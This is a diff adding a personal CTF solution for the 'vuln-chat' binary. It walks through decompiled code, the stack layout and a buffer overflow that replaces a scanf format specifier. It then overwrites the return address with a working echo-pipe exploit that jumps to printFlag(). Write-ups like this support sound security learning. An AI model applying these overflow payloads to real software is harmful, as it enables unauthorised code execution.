@@ -1,0 +1,56 @@
+=== Personal solution description ===
+
+If we decompile the main function and clean it up:
+
+---------------------------------------------------------------------------------
+	undefined4 main(void)
+
+	{
+	  undefined trust_info [20];
+	  undefined username [20];
+	  char format_spec [4];
+	  
+	  setvbuf(stdout,(char *)0x0,2,0x14);
+	  puts("----------- Welcome to vuln-chat -------------");
+	  printf("Enter your username: ");
+	  format_spec = L'\x73303325';
+	  __isoc99_scanf(format_spec,username);
+	  printf("Welcome %s!\n",username);
+	  puts("Connecting to \'djinn\'");
+	  sleep(1);
+	  puts("--- \'djinn\' has joined your chat ---");
+	  puts("djinn: I have the information. But how do I know I can trust you?");
+	  printf("%s: ",username);
+	  __isoc99_scanf(format_spec,trust_info);
+	  puts("djinn: Sorry. That\'s not good enough");
+	  fflush(stdout);
+	  return 0;
+	}
+---------------------------------------------------------------------------------
+
+We can see that the format specifier is 0x73303325, which when translated to char is "%30s" (but little-endian).
+
+So we can overwrite 10 characters, from reading the username buffer. Let's see the stack arrangement:
+---------------------------------------------------------------------------------
+                   undefined main()
+ undefined         AL:1           <RETURN>
+ undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
+ char[4]           Stack[-0x9]:4  format_spec                             XREF[3]:     080485be(W), 
+																					   080485cd(*), 
+																					   08048630(*)  
+ undefined1[20]    Stack[-0x1d]   username                                XREF[3]:     080485c9(*), 
+																					   080485d9(*), 
+																					   0804861b(*)  
+ undefined1[20]    Stack[-0x31]   trust_info                              XREF[1]:     0804862c(*)  
+---------------------------------------------------------------------------------
+
+As we can see, we can overwrite the format specifier, which is later used when reading the "trust_info" buffer. This means we can effectively bypass the 30 characters format specifier.
+Afterwards, we can just overwrite the return address using the trust_info buffer, using 49 padded bytes (0x31) and then 4 bytes for the return address (binary is 32 bits):
+
+                       space to skip to second scanf
+                                  \/         
+$ echo -ne 'aaaaaaaaaaaaaaaaaaaa%s aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x6b\x85\x04\x08' | ./vuln-chat
+                                /\                                                   /\
+			    overwrite the format spec                              return address of printFlag() function (as found from Ghidra and gdb)
+								
+
